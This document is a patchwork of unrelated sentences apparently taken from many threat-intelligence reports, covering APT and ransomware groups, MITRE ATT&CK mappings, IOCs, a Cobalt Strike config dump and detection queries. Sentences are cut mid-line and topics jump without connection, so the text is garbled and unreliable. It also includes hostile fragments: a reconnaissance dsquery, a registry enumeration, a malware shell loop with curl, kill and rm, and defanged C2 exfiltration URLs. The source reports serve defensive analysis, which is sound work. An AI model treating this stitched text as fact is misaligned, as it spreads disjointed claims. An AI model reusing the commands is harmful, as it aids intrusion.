Figure 3: Email body lure with nuclear themes Malicious Payloads via CHM and Microsoft Excel Files Multiple payloads have been observed being delivered.
We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.
Later they switched to capturing traffic from real EMV-based chip card transactions.
Defense Evasion Technique Title ID Use Indicator Removal on Host T1070 Hive actors delete Windows event logs, specifically, the System, Security and Application logs. 
In the case of MosaicRegressor, the Windows payload was named “IntelUpdater.exe” MITM attacks on firmware and software update features – Additionally, the insecure nature of the update process opens the door to MITM techniques via a compromised router, compromised device on the same network segment, DNS poisoning, or other network manipulation.
The original dropper process continues to execute in order to orchestrate the mining operations.
Top 10 countries affected by ViperSoftX malware in the enterprise (top) and consumer (bottom) sectors Source: Trend Micro Smart Protection Network (SPN) Conclusion and insights While other cybercriminals use sideloading to load another non-binary component (usually the encrypted payload, which comes together as a package with the normal executable and the sideloaded DLL), the chosen techniques of the actors behind ViperSoftX (which involve using WMI Query Language (WQL), DLL sideloading/DLL load order hijacking, PowerShell reflective loading, browser hijacking, and C&C protection) are sophisticated. 
The second version appeared to be completely rewritten, as shown in Figure 1. Figure 1.
Former members of the Trickbot/Conti syndicate which X-Force tracks as ITG23 have been using Domino since at least late February 2023 to deliver either the Project Nemesis information stealer or more capable backdoors such as Cobalt Strike. 
The account name is prefixed with MSOL_
Through the later review of the logging and after-action analysis of the event, more detections rules have been created to better alert on what visibility does exist in this, and many other, client environments. 
"reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >>
The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the file’s beginning.
4.
[D3-CAA] Platform Monitoring [D3-PM] Process Analysis Process Spawn Analysis
These sources also provide risk assessments if any of the recorded vulnerabilities are successfully exploited. 
Credential Theft Attacks Attackers use a variety of tools and techniques to execute credential theft attacks.
Enabling firewall customers to identify user agents of compromised version of 3cx SELECT timestamp, log_component, log_subtype, user_name, user_group, app_name, src_ip, src_port, protocol, dst_ip, dst_port, http_category, url, domain, http_user_agent, http_status FROM xgfw_data WHERE LOWER(log_component) = 'http' AND ( LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.12.402%' OR LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.12.416%' OR LOWER(http_user_agent) LIKE '%
Big shout-out to @Kostastsale for helping put this Part 2 together!
We’ve noted a significant number of victims in the consumer and enterprise sectors, with Australia, Japan, and the United States as the top three countries affected by ViperSoftX in the consumer category.
2.1 Injectors Figure 14.
Holds the stealer version rhc.exe
[D3-EAL] Scheduled Task/Job [T1053] Cron
The degradation of ESXi servers used for virtualization in victim environments.
0x0001 0x0002 0 0x0028 killdate 0x0002 0x0004 0 0x0029 textSectionEnd 0x0002 0x0004 155989 0x002a ObfuscateSectionsInfo 0x0003 0x0020 '\x00p\x02\x00á\x0b\x03\x00\x00\x10\x03\x00 ·\x03\x00\x00À\x03\x00\x1cÞ\x03' 0x002b process-inject-start-rwx 0x0001 0x0002 4 PAGE_READWRITE 0x002c process-inject-use-rwx 0x0001 0x0002 32 PAGE_EXECUTE_READ 0x002d process-inject-min_alloc 0x0002 0x0004
Not only that, Insights will also help you prioritize threats, predict if your countermeasures will work and prescribe corrective actions. 
Payload file with the config to communicate with Command & Control Server (C2). 
Open decoy document Figure 24 shows the whole execution flow of COOLCLIENT. Figure 24.
-sta
Ingress Tool Transfer Downloads and uploads files to and from the victim’s machine. 
/y /q
Usually, the number of all time downloads is significantly higher than the number of active installations, since it’s common practice to download plugins, test them, and remove/disable afterwards.
title: FedEx Phishing Campaign Abusing TrustedForm and PAAY url: https://www.netskope.com/blog/fedex-phishing-campaign-abusing-trustedform-and-paay Summary Netskope Threat Labs is tracking a phishing campaign that mimics a FedEx package delivery as bait to steal credit card data.
[D3-PMAD] Relay Pattern Analysis
Since then, Vice Society has used a variety of different ransomware strains including the following notable examples: In June 2021, Vice Society infected victims with HelloKitty. 
Function that loads library during the runtime. 
As mentioned above, its name in the export directory is guard64.dll.
C:\Users\Public\test.vbs (SHA2: ADBA59F1495965684EEB4C5DAAD67F732FEB5E9183AE05EB869E20C88CAD7327) C:\Users\Public\onedrive.ps1 (SHA2: 7A9705A424A634A321DB9F36B61D74B953A44D44EDC429F7641BF830870572FC) Once launched, it executes the onedrive.vbs and test.vbs files. 
Protection at this stage is heavily dependent on adaptable anti-malware on both end user devices and servers, network controls and security operation’s capability to monitor logs for anomalies in privileged access or network traffic.
Vulnerability 1: Non-unique x-coordinate\nIn this first vulnerability example, we show how implementations blindly using the x-coordinate of the hash output could lead to collisions.\n
[T1078.004] External Remote Services [T1133] Drive-by Compromise [T1189] Exploit Public-Facing Application [T1190] Supply Chain Compromise: Compromise Software Supply Chain
For example, some ISPs use it to display advertisements based on a user’s browsing history.
To protect yourself against these threats, intelligence reports can help.
NetScan output that operator(s) left on disk containing Cyrillic characters.
Indicators of CompromiseFiles1680478346389.zipMD5: 9e6c45b6b8b20bf3c5959dbba8f27117LiveUpdate360.datMD5: f149d3f3ef0361ebe4d346811f29b527LiveUpdate.exeMD5: 96e4b47a136910d6f588b40d872e7f9dsetting.iniMD5: 91aab4bbe634be62d11d132738c23a82SqlVersion9.dllMD5: 317f9ff06c076e87e5b1d11242396d5fú¿╡τ-╫╙-╖ó-╞▒ú⌐.exeMD5: 4723a2a8f68c1eaf82809cff29b8e56fURLshxxps://api[.]youkesdt[.]asia/admin/down/hash/79b7c6ed-c4d8-4b36-b1cd-f968e6570010hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/SqlVersion9[.]dllhxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/Media[.]xmlhxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate360[.]dathxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate[.]exehxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/223[.]114[.]txtCommand and Controlhxxp://61[.]160[.]223[.]114:18076All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks.
The following section shows similarities with Lazarus’s Windows backdoor called BADCALL. 
= "" ] && kill "$PIDW" > /dev/null 2>&1; [ "$PID" !
The authors have added new communications protocols, an updated loading mechanism, and expanded the number of supported configurations in newer versions.
We were not able to get further additional payloads from the command and control (C2) servers, but in some instances were able to get the file names of next stages from active C2s. 
.c .cbr .cer .cfm .class .cpp .crdownload .cs .csr .css .csv .cue .dat .db 
Disclaimer:
Figure 2: Original and decoy sites comparison As you can see from the example above, the threat actor took extended measures to ensure that the delivery chain looks legitimate even to technical users.
Get Temp path and make a temporary file as a bat and launch it Finally, the malware will finish with “ExitProcess”. 
Table 1.
It’s also unclear why the attacker would use such an old version of IronPython. 
Prevent users from installing Python where not required. 
It is mainly used for web application attacks, and it is configured in a client/server relationship.
ZeroDay Vulnerability in MOVEit Transfer Exploited for Data Theft
If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity (e.g. excessive use of pbcopy/pbpaste (Linux) or clip.exe (Windows) run by general users through command line). 
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors.
Percentage of Royal ransomware attacks by country Infection Routine External reports mention that the Royal ransomware group uses callback phishing as a means of delivering their ransomware to victims (Figure 2).
2.
backdoor hashsync-system-time[.]cfDomainDrokbk C2 infrastructureupdate-windows-security[.]tkDomainDrokbk C2 infrastructuredns-iprecords[.]tkDomainDrokbk C2 infrastructureuniversityofmhealth[.]bizDomainDrokbk C2 infrastructureoracle-java[.]cfDomainDrokbk C2 infrastructure54.39.202[.]0 IP addressDrokbk C2 infrastructure51.89.135[.]15IP
This is not surprising, considering that publishing a victims’ data is part of NetWalker’s model. 
Masquerading Files dropped in the victim’s environment by Vice Society may have been altered to appear legitimate. 
This is similar in nature to malware which may rely, for example, on the Windows Registry or NTFS Extended Attributes to hide their data, which also provide locations to store and retrieve binary data with the Windows API. 
Figure 11 OneNote Template Upon clicking the Open button, it drops the HTA file with the name Open.hta to the %temp%
Windows Service Winnti persists on infected machines by creating new services T1053.005 Scheduled Task/Job: Scheduled Task Winnti creates a task with schtasks for persistence Defense evasion T1140 Deobfuscate/Decode Files or Information To store shellcode with the payload, Winnti uses a custom PL format with encryption T1574.002 Hijack Execution Flow: DLL Side-Loading Winnti uses legitimate utilities to load DLLs from ShadowPad and PlugX T1562.004 Impair Defenses: Disable or Modify System Firewall FunnySwitch adds allow rules to Windows Firewall for C2 connections T1070 Indicator Removal on Host Paranoid PlugX deletes artifacts created during infection from the file system and registry T1202 Indirect Command Execution Winnti uses intermediate VBS scripts to run .bat
In the latter, the exported function name VFEP of the ComRAT payload gets passed.
Restrict which commands can be used. 
Latin American Governments Targeted By Ransomware
Initial AccessT1190Exploit Public-Facing ApplicationTA410 has exploited web server vulnerabilities for initial access. 
NEW ENHANCED ANTI-DEBUG TECHNIQUE 
A DNS tunneling attack works as follows:The attacker has a server with a domain name pointing to it.
This suggests they already had a foothold inside 3CX’s network late last year. 
This ensures that only the intended hosts do network share encryption and all those that were rebooted into safeboot minimal do not flood the network simultaneously encrypting all files.
Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate.
The Qualys Threat Research Unit (TRU) is tracking a supply chain compromise in a popular VOIP desktop client by 3CX that is attributed to DPRK nation-state adversaries.
Username hint: <Redacted> "<Provider Name=""Microsoft-Windows-RemoteDesktopServices-RdpCoreTS"" Guid=""{1139C61B-B549-4251-8ED3-27250A1EDEC8}"" /> <EventID>131</EventID> <Version>0</Version> <Level>4</Level> <Task>4</Task> <Opcode>15</Opcode> <Keywords>0x4000000000000000</Keywords> <TimeCreated SystemTime=""2023-04-06T09:23:41.969586500Z"" /> <EventRecordID>633</EventRecordID> <Correlation ActivityID=""{F4208FE1-4D5D-45DF-B8E2-A851AC3F0000}"" /> <Execution ProcessID=""1136"" ThreadID=""2228"" /> <Channel>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational</Channel> <Computer> <Redacted> </Computer> <Security UserID=""S-1-5-20"" /> </System> <EventData> <Data Name=""ConnType"">TCP</Data> <Data Name=""ClientIP""> <Redacted>:56736</Data> </EventData> </Event>" Incident #2 Similar to Incident #1, the threat actor was able to RDP unencumbered across the organization’s infrastructure. 
link accessible through a TOR browser, enabling victim organizations to contact the actors through a live chat panel to discuss payment for their files.
Commands are used to download and run the Trojan Installer. 
> /dev/null 2>&1;rm
Warning from a PoS vendor about Prilex social engineering attacks Messing with the EMV standard Brazil began migrating to EMV in 1999, and today, nearly all cards issued in the country are chip enabled.
BlackCat attempts to kill several processes and services to hinder or prevent security solutions and backups.
These byte arrays are then used with .NET reflection to perform an in-memory load of the assembly from its bytes, locate the binary’s entry point, and perform an Invoke on both. 
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.
Part of the decompiled code for libpng13.dll on the left and on the right the same code deobfuscated Micr.jpg is actually shellcode that also contains an embedded DLL.
Over C2 ChannelThe attackers have used various RATs that exfiltrate data over the same channel used for C&C. 12 Jan 2021 - 11:30AM 
This PCAP above shows the conversation from the 3-way handshake to the resetting of the connection. 
To that end, Agrius operators probably executed a supply-chain attack by targeting an Israeli software company’s software updating mechanisms to deploy Fantasy, its newest wiper, to victims in Israel, Hong Kong, and South Africa.
Service ScanningTechniqueT1046https://attack.mitre.org/techniques/T1046Network Share DiscoveryTechniqueT1135https://attack.mitre.org/techniques/T1135Permission Groups DiscoveryTechniqueT1069https://attack.mitre.org/techniques/T1069Process DiscoveryTechniqueT1057https://attack.mitre.org/techniques/T1057Query RegistryTechniqueT1012https://attack.mitre.org/techniques/T1012Remote System DiscoveryTechniqueT1018https://attack.mitre.org/techniques/T1018System Information DiscoveryTechniqueT1082https://attack.mitre.org/techniques/T1082System Network Configuration DiscoveryTechniqueT1016https://attack.mitre.org/techniques/T1016System Network Connections DiscoveryTechniqueT1049https://attack.mitre.org/techniques/T1049System Owner/User DiscoveryTechniqueT1033https://attack.mitre.org/techniques/T1033System Service DiscoveryTechniqueT1007https://attack.mitre.org/techniques/T1007System Time DiscoveryTechniqueT1124https://attack.mitre.org/techniques/T1124Lateral MovementTacticTA0008https://attack.mitre.org/tactics/TA0008/Lateral Tool TransferTechniqueT1570https://attack.mitre.org/techniques/T1570/Remote Services: SMB/Windows Admin SharesTechniqueT1021.002https://attack.mitre.org/techniques/T1021/002/Remote Services: SSHTechniqueT1021.004https://attack.mitre.org/techniques/T1021/004/Remote Services:
To prevent the DNS NXD flood attack, we should:Conduct regular DNS audits.
This will give you immediate visibility over all running code and quickly identify infected machines by detecting any traces of malicious code found in-memory.
Figure 9.
When Windows cannot load an application because of a missing library, it will show a “System Error” error message box that displays the missing library name. 
The following commands were used to collect information about the system and logged in users. 
Linking TZW Attacks to GlobeImposter AhnLab’s research revealed a ransomware campaign they referred to as “TZW” with victims in South Korea.
Remote Administration Tool was created by a Chinese hacking group named C. Rufus Security Team that released it publicly in 2008.
AA21200A Tactics Techniques and Procedures of Indicted APT40 Actors Associated with Chinas MSS Hainan State Security Department
The XOR key differs (0x5E vs. 0x7E), but the configuration bears the same name: apdl.cf (see Figure 8). Figure 8.
The encrypted data is then exfiltrated using the below C&C URL: hxxps://13[.]236[.]189[.]80:8001/G0AnyWhere_up[.]jsp?Data=[redacted] The figure below illustrates the exfiltrated data sent to the C&C server, as well as the decrypted/decoded stolen information obtained from the victim’s machine. 
Figure 21: Decompiled decryption function Figure 22: Decryption function in Python Figure 23: Decrypted strings The second decompressed data blob contains the following: 
But most importantly: The largest overlap is in the top half of the pyramid of pain: domain names, host artifacts, tools, and TTPs.
So Long, and Thanks for All the Fish! 
New IoCs analyzed in surrounding text.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) have observed persistent continued cyber intrusions by advanced persistent threat (APT) actors targeting U.S. think tanks.
A service was installed in the system (powershell) 5008357 [WINDOWS-SECURITY]
TA0004 Privilege Escalation T1068.
Executive SummaryAnother threat actor is actively exploiting the so-called PrintNightmare vulnerability (CVE-2021-1675 / CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's network as part of a recent ransomware attack, according to Cisco Talos Incident Response research.
Finally, based on several indicators, geopolitical objectives and the analyzed artifacts, Cluster25 attributes this campaign to the Russia-linked threat actor known as APT28 (aka Fancy Bear, TSAR Team, Pawn Storm, Sednit) and indicates entities and individuals operating in the defense and government sectors of Europe and Eastern Europe countries as potential targets. 
Click here for Anomali recommendation BusyGasper – The Unfriendly Spy (August 29, 2018) Security researchers from Kaspersky Lab uncovered a new family of spyware, dubbed “BusyGasper,” that targets Android devices.
[TA0002] Command and scripting interpreters
T1484Access Token Manipulation – T1134Create Account – T1136Remote System Discovery – T1018Network Service Scanning – T1046Domain Account – T1087.002Impair Defenses – T1562 Internal case: 3584 The post Conti Ransomware appeared first on The DFIR Report. 
In the above screenshot the numbers after “POST /” were randomly generated. 
北京华林保软件技术有限公司 Indicator Removal The threat actor was observed deleting files that had been dropped to disk. 
Contents:New malware taste, classic Balada flavorAs with any new vulnerability like this the attackers associated with the years-long Balada malware campaign (which we have documented extensively on this blog) were quick to jump on the opportunity.
Figure 3 Code with anti-debugging and image deletion As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code. 
Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP. 
In March 2023, ESET published a detailed technical report on this backdoor, which it named “MQsTTang.” 
This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.
Each block is then re-encrypted with the new key material as follows: The encryption key is the 16-byte GUID from GetVolumeNameForVolumeMountPointW().
Update Service Principal Company-Created Service Principal Hijacking Next, the threat actor utilized the threat actor-created Service Principal to take control of a second Service Principal.
Persistence Technique Title ID Use Account Manipulation T1098 The team elevated account privileges to administrator and modified the user’s account by adding Create Policy and Delete Policy permissions. 
It can be especially hard to collect forensic evidence for an attack when it could be mixed in with the code of legitimate and large files.
Add external sender banners to emails to alert users that the email came from an external sender. 
Updated New Evidence Emerges to Suggest WatchDog Was Behind Crypto Campaign
The malware can also create a backdoor on the infected machine, enabling an attacker to install further malicious software.
Mitigating the Dependency Problem What can we do about this dependency problem for analysis at scale?
It just happens to be a malicious module.
[T1133] Chinese state-sponsored cyber actors have been observed: Exploiting vulnerable devices immediately after conducting scans for critical zero-day or publicly disclosed vulnerabilities.
As mentioned earlier, instead of using a Looper with nested vfgadget, for the sake of brevity, we opted to use a single gadget that features both the Invoker and Argument Loader components. 
Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials. 
File and Directory Discovery T1083 TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.
The HTTPS connection is not used again.
The Remcos RAT identified in this case communicates to zazuservr[.]com over port 9019. 
Over the past several years, multiple cyber security firms and the FBI have posted increased observation of the use of “RClone” to exfil data.
PowerSploit does provide a module called “Invoke-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.
Update systems to the latest validated firmware and software in order to address security issues like this one. Inspect and disable the “APP Center Download & Install” feature in UEFI/BIOS Setup on Gigabyte systems and set a BIOS password to deter malicious changes. 
[PASSWORD] -accepteula -s
C:\MS_DATA\&dsquery * -limit 0 -filter "&(objectClass=User)(objectCategory=Person)"
The vulnerability originates in the consensus code and allowed for Bitcoin miners to have the option of sending transaction data twice.
[T1490 – Inhibit System Recovery] dllhost32.exe -n=10 -s
Proofpoint anticipates that while many threat actors will continue to use the Standard variant, it is likely the new variants will continue to be used to facilitate additional malware attacks. 
= "true" ]; do curl --silent -o "$d_md5" "http://127.0.0.1:4445/$MD5"; [ -f "$d_md5" ] && finished="true" && md2=$(cat "$d_md5") && rm -rf "$d_md5"; sleep 5; (pgrep -x 'Activity Monitor' > /dev/null) && ([ "$I2PD_PID" !
TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021. 
These file extensions include .nvram,.vmdk,.vmem,.vmsd,.vmsn,.vmss,.vmx,.vmxf, and .vswp.
By analyzing Azure AD sign-ins, CrowdStrike was able to use known indicators of compromise (IOCs) to identify several threat actor logins to customer environments.
Unlike the murky objectives of the previous campaign, it is quickly evident that these samples are part of a separate campaign to launch Distributed Denial of Service (DDoS) attacks against game servers, which we believe to be a re-emergence of a similar campaign from earlier this year. 
Attackers can use TrickBot to: Drop other malware, such as Ryuk and Conti ransomware, or Serve as an Emotet downloader (Ingress Tool Transfer [T1105]).[1] TrickBot uses person-in-the-browser attacks to steal information, such as login credentials (Man in the Browser
HIDE_PREFIX L”svc32″ R77_SERVICE_NAME64 Name for the scheduled task that starts the r77 service for 64-bit processes. 
Vice Society ransom note using Zeppelin ransomware.
This might indicate a spam campaign is ongoing from the organization’s mailbox. 
The ransomware then appends the ._locked file extension, modifies registry keys to maintain persistence, and drops ransom notes. 
If unaddressed, ransomware attacks on local, provincial, or federal government entities in LATAM could constitute a credible national and geopolitical security risk.
Domino Loader The payload received by the Domino backdoor from the C2 during this analysis was a 64-bit DLL, written in C++, with MD5 hash 2373BE26018075847AEA51636B739F66 and an internal filename of MultiRunDll64.dll.
These settings include specifying the size of large files where partial encryption is applied instead of encrypting the entire file, defining the primary path for encryption, specifying file paths to skip during encryption, targeting specific services and processes, configuring autorun entries, enabling auto ransom note opening, and even changing wallpapers on infected systems. 
Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.
For example, threat actors often leverage internet software repositories such as GitHub and Exploit-DB.[10][11]
The 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant.
For example, use of W4SP crew obfuscation tools such as Hyperion and Kramer is on the rise — likely a response to the improving detection capabilities of security companies monitoring PyPI and other public package repositories. 
shell whoami /all 
Affected Platforms: LinuxImpacted Users: Any organizationImpact: 
HTTP C2 Communication LokiBot exfiltrates information to the C2 through the HTTP protocol.
Payloads The payloads used in Operation Spalax are remote access trojans.
MSDolphin backdoor version 3.0 (x64) MITRE ATT&CK techniques This table was built using version 12 of the MITRE ATT&CK framework. 
The team identified employee names via open-source research that could be used to derive email addresses. 
The actor proceeded to log in several more times from a Surfshark VPN endpoint, however, they were not observed carrying out any further suspicious activity. 
Along with this blog post, Mandiant has produced a detailed MOVEit Containment and Hardening guide to assist organizations with this event.
Figure 9: Contents of update.bat The requestadmin.bat is responsible for performing antivirus tampering – adding %APPDATA% and %USERPROFILE%\ paths to Windows Defender exclusion to prevent Defender from scanning the mentioned paths.
MERCURY likely exploited known vulnerabilities in unpatched applications for initial access before handing off access to DEV-1084 to perform extensive reconnaissance and discovery, establish persistence, and move laterally throughout the network, oftentimes waiting weeks and sometimes months before progressing to the next stage.
All of these factors make us believe that we may be dealing with one of the fastest ransomware out there. 
However, this technique was likely performed on the other two client domains where visibility gaps existed.
Zerobot is offered as part of a malware as a service scheme and has been updated several times since Microsoft started to track it.
[email protected]#_!
If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
It’s unclear how the threat actor was able to sign its malware using Kuwait Telecommunications Company’s certificate, but we suspect it was stolen.
[OPTION]... -i
Table 2.
Account Manipulation:
Maintaining vigilance and implementing effective security measures are imperative to mitigate the risks posed by this persistent threat actor. 
It is a note-taking app that allows collaboration across organizations while enabling users to embed files and other artifacts.
T1021.002 Remote Services: SMB/Windows Admin Shares LockBit 2.0 has been known to self-propagate via SMB. 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud). 
If the window is visible, it adds this window owner’s process ID to an array containing all current processes that have at least one visible window: Figure 1 – SmadAV code that collects a list of PIDs that have associated windows. 
The intelligence in this week’s iteration discuss the following threats: Credit card theft, DDoS, Phishing, Ransomware, Trojan, Vulnerabilities, and Web cache poisoning.
Then it enables “less secure app access” by sending an undocumented RPC request via an HTTP POST to: https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute These modifications are referred to as “thunder access” in the backdoor, likely being a reference to the Thunderbird email client.
T1543.003 Create or Modify System Process: Windows Service Adversary launched backdoor and some tools as a Windows Service including adding of registry keys T1546.003 Event-Triggered Execution: WMI Event Subscription WMI was used for running commands on remote systems T1053.005 Scheduled task Adversary ran scheduled tasks for persistence of certain malware samples T1078 Valid accounts Using Mimikatz and dumping of lsass, the adversary gained credentials in the network T1020 Automated exfiltration The PlugX malware exfiltrated data towards a C2 and received commands to gather more information about the victim’s compromised host. T1030 Data transfer size limits Adversary limited the size of rar files for exfiltration T1070.004 Indicator removal on host Where in the beginning of the campaign the adversary was sloppy, during the last months of activity they became more careful and started to remove evidence T1041 Exfiltration over C2 channel Adversary used several C2 domains to interact with compromised hosts. 
The intermediate password is the SHA-256 hash sum of the base encryption key.
Installers The installers downloaded from the fake websites are not hosted on the same server as the websites, but in the Alibaba Cloud Object Storage Service.
[T1546.008] Boot or Logon Autostart Execution: Shortcut Modification
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
It is worth noting that this installer and the deployed loader are not exclusive to Dolphin, and were previously seen used with other ScarCruft malware. 
T1529System Shutdown/RebootFantasy reboots the system after completing its disk and data wiping payloads. 
It is stored inside the efi\microsoft\boot\en-us\ directory, with the name consisting of hexadecimal characters.
ESET Research also offers private APT intelligence reports and data feeds.
[T1564] Chinese state-sponsored cyber actors were observed using benign executables which used DLL load-order hijacking to activate the malware installation process. 
Who did it? 
Key Takeaways Chinese MSS-affiliated cyber threat actors use open-source information to plan and conduct cyber operations. 
If the user opens it directly, a message warns that the document is password-protected. 
The beacon C:\ProgramData\lsass.exe was used to proxy RDP connections and connect to another computer. 
T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size. 
Preparing for departure The first tools deployed by Agrius operators to victim systems, through means unknown, were: MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps” SecretsDump, a Python script that “performs various techniques to dump hashes from [a] remote machine without executing any agent there” Host2IP, a custom C#/.NET tool that resolves a hostname to an IP address. 
The deployment of custom credential theft malware is central to this new campaign.
Most notably, TeamTNT was reported to have copied the code used to detect and remove Alibaba Cloud Security from compromised instances from the Kinsing group.
The function in the embedded DLL that decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration.
Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version. 
and
During the investigation, we found that Gopuram coexisted on victim machines with AppleJeus, a backdoor attributed to the Korean-speaking threat actor Lazarus. 
Our investigations showed that the gang used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.
Join discussions at the Microsoft 365 Defender tech community. 
Then, it creates and sets a new value for the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
Additionally, some of these platforms even allow for modifying the content of generated URI, enhancing the adaptability and control over the shared resources. 
These tactics include distributing phishing emails containing malicious files, utilizing drive-by downloads, and exploiting vulnerabilities in the remote desktop protocol (RDP).
OneNote quickly gained traction and was adopted by several threat groups (including Qakbot) in January and early February 2023.
While Conti was recognized as being the most prolific ransomware deployed in 2021 per our 2022 Unit 42 Ransomware Threat Report, LockBit 2.0 is the most impactful and widely deployed ransomware variant we have observed in all ransomware breaches during the first quarter of 2022, considering both leak site data and data from cases handled by Unit 42 incident responders. 
The location of the SQLite databases is defined by the data_folder install configuration key, with the default value being %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\fcdata. 
Goodware String - occured 207 times */$s5 = "?klopW@@YAHXZ" fullword ascii$s6 = "?jutre@@YAHXZ" fullword ascii$s7 = "PluginInit" fullword ascii$s8 = "[]_^A\\A]A^A_"
The malware shares high-level functionality with other malware families.
Ensure applications do not store sensitive data or credentials insecurely. 
Suspicious command line execution (click to enlarge) To maximize protection, CrowdStrike recommends enabling the following prevention policy visibility and configuration toggles. 
This prefix hardens the visualization of the attack on the system, but eases attribution of the malware family during the analysis.
Figure 6.
Conversely, in wave 2 the threat actor embedded the signed raw disk driver in the wiper executable, dropped it and then installed it.
Table 12: Patch Information for Vulnerabilities Routinely Exploited by MSS-affiliated Cyber Actors Vulnerability Vulnerable Products Patch Information CVE-2020-5902 Big-IP devices (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO, CGNAT) F5 Security Advisory: K52145254: TMUI RCE vulnerability CVE-2020-5902 CVE-2019-19781 Citrix Application Delivery Controller Citrix Gateway Citrix SDWAN WANOP Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway versions 11.1 and 12.0 Citrix blog post: security updates for Citrix SD-WAN WANOP release 10.2.6 and 11.0.3 Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway versions 12.1 and 13.0 Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway version 10.5 CVE-2019-11510 Pulse Connect Secure 9.0R1 - 9.0R3.3, 8.3R1 - 8.3R7, 8.2R1 - 8.2R12, 8.1R1 - 8.1R15 Pulse Policy Secure 9.0R1 - 9.0R3.1, 5.4R1 - 5.4R7, 5.3R1 - 5.3R12, 5.2R1 - 5.2R12, 5.1R1 - 5.1R15 Pulse Secure Out-of-Cycle Advisory:
Privilege escalation and lateral movement often depend on software utilities running from the command line.
While its possible a system administrator would make such exceptions during troubleshooting, given the risk of this activity, it’s something that should be investigated promptly if a corresponding support ticket isn’t found. 
[T1136.001] and tests for internet connectivity by pinging 8.8.8.8
Disable or Modify Tools T1562.001 Credential Access OS Credential Dumping: LSASS Memory T1003.001 OS Credential Dumping: LSA Secrets T1003.004 OS Credential Dumping: Cached Domain Credentials T1003.005 Unsecured Credentials: Credentials In Files T1552.001 Discovery System Network Configuration Discovery T1016 System Owner/User Discovery T1033 System Network Connections Discovery T1049 Process Discovery T1057 System Information Discovery T1082 File and Directory Discovery T1083 Account Discovery: Domain Account T1087.002 Software Discovery T1518 Security Software Discovery T1518.001 Collection Screen Capture T1113 Archive Collected Data: Archive via Utility T1560.001 Command and Control Application Layer Protocol: Web Protocols T1071.001 Proxy: External Proxy T1090.002 Web Service:
Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
Network packet capture and analysis. 
Figure 13 shows how this analytic detects the simulated behavior of RedLine Stealer, in Python script, in cracking browser sensitive information. 
" | where RawEventData.
Command and Control Emotet In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage. 
While my team didn’t collect enough evidence to prove that assumption one way or another, harvesting the filenames by incrementing file ID let us determine that the attack was successful in some cases.
Use Remote Browser Isolation (RBI) technology to provide additional protection when there is a need to visit websites that fall in categories that can present higher risk, like Newly Observed and Newly Registered Domains. 
We continue to track the group’s activities and this October we observed the adoption of new malware strains in its arsenal.
For the full timeline, see Figure 9.
Contents of video.rarThe executable files are self-contained loaders of Cobalt Strike Beacon PL shellcode with a similar configuration and the same C2 server. 
While previous UEFI firmware compromises (i.e. LoJax and MosaicRegressor) manifested as additions of DXE drivers to the overall firmware image on the SPI flash, the current case exhibits a much more subtle and stealthy technique where an existing firmware component is modified to alter its behaviour.
It is highly targeted and is usually delivered through social engineering, e.g., a target business may receive a call from a “technician” who insists that the company needs to update its PoS software.
Shellcode which is used for code injection. 
Windows Event Log entry showing connection to O365 tenants O365 Company Service Principal Manipulation 
